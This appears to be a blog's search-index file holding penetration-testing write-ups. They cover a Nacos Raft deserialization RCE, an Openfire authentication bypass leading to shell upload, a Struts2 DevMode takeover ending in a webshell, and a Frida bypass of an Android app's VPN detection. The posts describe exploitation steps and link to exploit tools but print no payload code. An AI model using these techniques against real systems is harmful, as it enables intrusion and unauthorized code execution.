<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Nacos集群Raft反序列化漏洞(QVD-2023-13065)-复现</title>
      <link href="/penetrationtest/2023/07/articles/4c6ad3c1efab8e8e/"/>
      <url>/penetrationtest/2023/07/articles/4c6ad3c1efab8e8e/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞起因"><a href="#漏洞起因" class="headerlink" title="漏洞起因"></a>漏洞起因</h2><ul><li>在Nacos集群处理部分Jraft请求时，攻击者可以无限制使用hessian进行反序列化利用，最终实现代码执行。Jraft通信端口默认7848。其中受影响版本<br/>1.4.0 <= Nacos < 1.4.6 <br/>2.0.0 <= Nacos < 2.2.3 <br/>这个漏洞的特点是不是直接使用http协议触发的漏洞。是用tcp Jraft 通信。神奇在于通过这个jraft 发送序列化的代码。直接注入web的内存马。这个漏洞比较新奇所以来复现一下</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ul><li>有漏洞的界面如下图:<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061705157.png" alt="界面"></p><p>存在Jraft 并且特征如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061708448.png" alt="漏洞特征"></p></li></ul><h2 id="工具复现"><a href="#工具复现" class="headerlink" title="工具复现"></a>工具复现</h2><ul><li>exp:https://github.com/c0olw/NacosRce/ 这个release 带着很多jar包。所以我们自己编译一个下载地址 见频道</li><li>结果如下:<p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307061717273.png" alt="实战结果"></li><br>brup成功特征。这个工具你如果执行cmd命令。那么自动给你注入cmd内存马我们在brup上执行一下<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202307070955954.png" alt="brup复现执行结果"></p></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-32315-openfire权限绕过rce</title>
      <link href="/penetrationtest/2023/06/articles/4d9b7730efb1222b/"/>
      <url>/penetrationtest/2023/06/articles/4d9b7730efb1222b/</url>
      
        <content type="html"><![CDATA[<h2 id="复现遇到的问题"><a href="#复现遇到的问题" class="headerlink" title="复现遇到的问题"></a>复现遇到的问题</h2><p>利用exp添加用户以后然后上传shell在下显示出插件名称。exp个人推荐：<br><a href="https://github.com/miko550/CVE-2023-32315">https://github.com/miko550/CVE-2023-32315</a><br>登陆以后来到来到插件这里<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211001134.png" alt="来到插件这里"><br>往下拉看到<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211003080.png" alt="上传点"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306210955127.png" alt="复现遇到的问题"><br>访问出现404页面<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306210958209.png" alt="访问出现"></p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><p>既然那么部署不行我们换一个部署利用其它的插件进行。我测试了这个页面其它插件也不行官方的。那么只有一个问题就是插件格式不对这个不能解析所以换成可以解析的插件部署复现。那我们可以下载他来的插件源码进行编译然后。直接访问就行了。这里我们用db-access插件来复现。<br>添加shell编译然后上传。上传后来这里查看点击<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211005566.png" alt="上传插件"><br>然后访问我们的shell。直接拿捏。<font color="red" size="4">由于这个漏洞特殊性和net的原因无法编写exp。后续群主不忙了专注研究软件的时候。会增加第三方库调用支持扩大软件使用功能。直接调用python或者go等漏洞利用程序。使我们的工具更加强大。工具和工具源代码还没有发布。请关注频道和github信息感谢大家支持。</font><br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306211008507.png" alt="拿下shell"></p><h2 id="遇到的工具编译后的插件下载"><a href="#遇到的工具编译后的插件下载" class="headerlink" title="遇到的工具编译后的插件下载"></a>遇到的工具编译后的插件下载</h2><p><a href="https://t.me/SoftwareUpdateChannel/211">https://t.me/SoftwareUpdateChannel/211</a></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2-DevMode漏洞渗透实战</title>
      <link href="/penetrationtest/2023/06/articles/3cce7d6763611bcc/"/>
      <url>/penetrationtest/2023/06/articles/3cce7d6763611bcc/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><ul><li>看博客看了这么长时间的兄弟估计有点疑惑这人。老发安卓到底是会不会渗透测试。我是在学习安卓逆向所以找点案例练练手。所以我发的安卓逆向的比较多。后续准备学习内网渗透测试。我是想自己可以掌握 包含 渗透测试 ,代码审计,安卓逆向,内网渗透,免杀这些所有的能力。为以后为了我们的工具和内部群和大家一起交流。所以我在不断努力中。</li><li>这篇文章带大家来看看渗透实战测试。这个遇到的实战比较少。之前有朋友在项目中也遇到没怎么搞。因为学习比较忙。前段时间闲来无事帮忙搞了一个渗透测试项目。又碰到这个漏洞了。这个漏洞碰到的比较少所以很少人可以搞定。吐司貌似也有一篇文章说的是这个漏洞如何利用。开始正题吧</li></ul><h2 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h2><ul><li>使用ABC_123 大佬的struts2 工具扫描出Struts2-DevMode见下图。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021416291.png" alt="发现目标"></p><li>因为是工具扫描出来的漏洞不确定他是否存在漏洞所以我们。要手工对这个网站进行测试。确定是否存在漏洞。另外确定网站是否存在waf等所以我们构造payload进行手工测试见下图:我们请求构造一个不存在的url然后报错了。说明开启了debug模式</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021421494.png" alt="开启了debug模式"></p></ul><h2 id="确定是否存在漏洞"><a href="#确定是否存在漏洞" class="headerlink" title="确定是否存在漏洞"></a>确定是否存在漏洞</h2><ul><li>我们使用payload打一下,回显了freemarker。所以我们确定这个100%是存在漏洞了</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021500117.png" alt="存在漏洞"></p></ul><h2 id="确定是否存在waf"><a href="#确定是否存在waf" class="headerlink" title="确定是否存在waf"></a>确定是否存在waf</h2><ul><li>祭出宽字节 struts-061的payload 打一下,确定不存在waf。但是没有打成功。尝试了许多exp。都返回null. 他们的exp都是在body里面返回结果。那么是不是body里面返回的不行呢。我们在header里面返回结果行不行(这个思路比较重要如果没有这个这个网站拿不下)</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021428973.png" alt="不存在waf"></p></ul><h2 id="改变exp思路成功执行命令"><a href="#改变exp思路成功执行命令" class="headerlink" title="改变exp思路成功执行命令"></a>改变exp思路成功执行命令</h2><ul><li>那我们找一个header返回的exp打一下。由于之前写我们的webframeworktools 工具的时候我们对struts2 工具的exp进行深入研究。所以直接找到可以在header里面执行payload的工具转换成执行命令的成功执行命令。由于这个比较隐秘exp我就打码处理了。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021458161.png" alt="成功执行命令"></p></li></ul><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><ul><li>看到可以只命令估计大部分的思路是反弹shell。然后就行了。但是我测试大部分反弹shell的东东反弹shell都不行。我用curl 测试可以出网。现有阶段我们不能反弹。只能看看能不能拿下webshell。有tomcat说可以解析jsp。那我们能不能利用wget下载然后getshell通过找网站特征图片.css，js，html。等后续最终确定了web路径。然后wget下载拿到shell了。后来想了一下我们能不能直接上传webshell呢。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021443322.png" alt="拿到webshell"></p></ul><h2 id="构造exp上传webshell"><a href="#构造exp上传webshell" class="headerlink" title="构造exp上传webshell"></a>构造exp上传webshell</h2><ul><li>根据工具的exp构造包上传webshell。此exp已经集成到工具里面了详情看更新https://github.com/peiqiF4ck/WebFrameworkTools-5.1-main</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021448694.png" alt="通过上传拿到webshell"></p></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>之所以能成功getshell就是我们打破常规思路。在header头部显示结果。成功了。后续内网渗透什么的。等我研究了后续有我自己实战渗透内网的东东或者是靶场什么的只要我觉得这个不错我会写文章。共享的。不管是渗透话是什么我们一定不能按照常规思路进行测试。因为常规测试的路子已经被别人知道了堵死了。至于如何练习自己的渗透思维。多练习。加自己的总结。</li></ul>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某appvpn代理检测绕过算法定位</title>
      <link href="/androidreverse/2023/06/articles/9d4835eb0ff8f92b/"/>
      <url>/androidreverse/2023/06/articles/9d4835eb0ff8f92b/</url>
      
        <content type="html"><![CDATA[<h2 id="安卓获取VPN代码"><a href="#安卓获取VPN代码" class="headerlink" title="安卓获取VPN代码"></a>安卓获取VPN代码</h2><ul></li>安卓vpn检测代码:</li><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">></span></span> networkInterfaces <span class="token operator">=</span> <span class="token class-name">NetworkInterface</span><span class="token punctuation">.</span><span class="token function">getNetworkInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>networkInterfaces<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token class-name">NetworkInterface</span> next <span class="token operator">=</span> networkInterfaces<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getName获得网络设备名称="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getDisplayName获得网络设备显示名称="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getDisplayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"getIndex获得网络接口的索引="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">getIndex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"isUp是否已经开启并运行="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">isUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"isBoopback是否为回调接口="</span> <span class="token operator">+</span> next<span class="token punctuation">.</span><span class="token function">isLoopback</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">logOutPut</span><span class="token punctuation">(</span><span class="token string">"**********************"</span> <span class="token operator">+</span> count<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SocketException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><li>上面代码就是获取vpn 名称什么各种信息的代码.有了上诉代码我就来编写frida hook vpn检测的hook脚本</li></ul><h2 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h2><ul><li>我们打开小黄鸟抓包工具。然后打开软件。可以看到检测vpn。因为小黄鸟这个就是基于 vpn的抓包工具。那么如果绕过呢。(1)我们就需要定位这个检测是在哪个函数。然后hook检测函数绕过。(2)另外我们也说了我们知道安卓如何获取vpn名称的代码我们可以hook检测到的名称修改成其他名字这不就绕过了.两步都能绕过。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020943617.png" alt="检测vpn"></p></ul><h2 id="定位思路"><a href="#定位思路" class="headerlink" title="定位思路"></a>定位思路</h2><ul><li>hook这个温馨提示 这个弹出的框定位检测函数</li><li>hook vpn检测函数 修改获取到的vpn名称</li><li>hook vpn检测函数 修改调用检测vpn函数的返回值</li><li>第一个我们不知道如何进行hook。我们只知道安卓是如何获取vpn的那么我们编写hook脚本进行定位。直接定位到。hook脚本发布到频道。请到频道下载。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020954590.png" alt="我们可以看到直接hook成功能"></p><li>我们进一步分析下这个检测函数。用jadx打开app。静态分析一下。一看app被加固了。这个360加固我们常规用frida-dexdump blackdex 进行脱壳。但是经过我测试。这两个都没有脱掉壳。这个壳子升级了。那我们只好祭出。我们修改过的脱壳系统。成功脱掉</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306020957949.png" alt="360加固"></p></ul><h2 id="分析app"><a href="#分析app" class="headerlink" title="分析app"></a>分析app</h2><ul><li>把脱壳后的zip文件放到jadx里面。由于jadx 反编译不出vpn检测代码我们用jeb进行反编译。我把完整检测代码放出来为了进一步了解是如何检测的。为了保护程序。部分关键代码替换。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021001833.png" alt="检测函数"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021002107.png" alt="vpn检测"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>zzzzz<span class="token punctuation">.</span>lib_common<span class="token punctuation">.</span>utils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>content<span class="token punctuation">.</span></span><span class="token class-name">Context</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">ConnectivityManager</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">android<span class="token punctuation">.</span>text<span class="token punctuation">.</span></span><span class="token class-name">TextUtils</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>zzzzz<span class="token punctuation">.</span>lib_common<span class="token punctuation">.</span>constant<span class="token punctuation">.</span></span><span class="token class-name">CommonConstant</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">NetworkInterface</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">SocketException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Collections</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">timber<span class="token punctuation">.</span>log<span class="token punctuation">.</span></span><span class="token class-name">Timber</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CheckDevice</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isVpnUsed</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Iterator</span> v0_1<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            v0_1 <span class="token operator">=</span> <span class="token class-name">Collections</span><span class="token punctuation">.</span><span class="token function">list</span><span class="token punctuation">(</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">.</span><span class="token function">getNetworkInterfaces</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">SocketException</span> v0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v0<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> v2 <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            label_10<span class="token operator">:</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>v0_1<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Object</span> v3 <span class="token operator">=</span> v0_1<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">NetworkInterface</span> v3_1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">NetworkInterface</span><span class="token punctuation">)</span>v3<span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>v3_1<span class="token punctuation">.</span><span class="token function">isUp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    v2 <span class="token operator">=</span> v3_1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//hook点</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"tun"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"ppp"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>v2<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"pptp"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">goto</span> label_10<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"VPNname %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>v2<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">SocketException</span> v0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span>        v0<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isWifiProxy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span> v0 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"http.proxyHost"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> v2 <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"http.proxyPort"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>v2 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v2 <span class="token operator">=</span> <span class="token string">"-1"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"代理proxyAddress %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>v0<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Timber</span><span class="token punctuation">.</span><span class="token function">d</span><span class="token punctuation">(</span><span class="token string">"代理proxyPort %s"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">!</span><span class="token class-name">TextUtils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">vpnnetworkCheck</span><span class="token punctuation">(</span><span class="token class-name">Context</span> arg2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"com.zzzzz.shenji"</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token class-name">CommonConstant</span><span class="token punctuation">.</span>PACKAGE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ConnectivityManager</span> v2_1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">ConnectivityManager</span><span class="token punctuation">)</span>arg2<span class="token punctuation">.</span><span class="token function">getSystemService</span><span class="token punctuation">(</span><span class="token string">"connectivity"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> v2_1<span class="token punctuation">.</span><span class="token function">getNetworkCapabilities</span><span class="token punctuation">(</span>v2_1<span class="token punctuation">.</span><span class="token function">getActiveNetwork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">hasTransport</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> v2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            v2<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre></ul><h2 id="定位弹窗"><a href="#定位弹窗" class="headerlink" title="定位弹窗"></a>定位弹窗</h2><ul><li>上一步我们分析了检测代码我们这来分析这个弹窗如何hook分析一下代码。查找。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021008821.png"></p><li>看到了检测点。由于这是表面所以我们要深入进行分析分析调用逻辑。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021009938.png"></p><li>下图调用这个setMessage  返回是他自己定义类那我们只有。从函数参数入手来定位了。发现是这个 this.binding.textContent.setText(charSequence); 。我们看 追踪到  public final TextView textContent; 可以看到import android.widget.TextView;这个属于安卓的那我们就hook这个看看</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021012166.png"></p><li>hook关键函数。我们hook到了。这个代码你们自己写就行了。我就不放了。到这里我们已经搞定抓包了。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021016586.png"></p></ul><h2 id="算法定位"><a href="#算法定位" class="headerlink" title="算法定位"></a>算法定位</h2><ul><li>来到登陆界面点击登陆抓包。咋眼一看。这和md5类似。掏出我们的算法通杀脚本进行。hook发现hook不到</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021021011.png"></p><li>放大招了我们祭出我自己总结的hook脚本来hook一下。hook到了。自己写的果然是比较不错哈哈哈。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021024412.png"></p><li>看了一下在标准md5得到结果以后对结果进行加工了一下。难怪hook不到。。。。</li><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202306021026252.png" alt="截图"></p></ul><h2 id="hookvpn脚本下载"><a href="#hookvpn脚本下载" class="headerlink" title="hookvpn脚本下载"></a>hookvpn脚本下载</h2><ul><li>分析到这里就分析完了。下载地址:https://t.me/SoftwareUpdateChannel/196</li></ul>]]></content>
      
      
      <categories>
          
          <category> AndroidReverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某颜色app抖阴加密算法分析-过root检测和so层初探</title>
      <link href="/androidreverse/2023/04/articles/c46552d11b0f0c1d/"/>
      <url>/androidreverse/2023/04/articles/c46552d11b0f0c1d/</url>
      
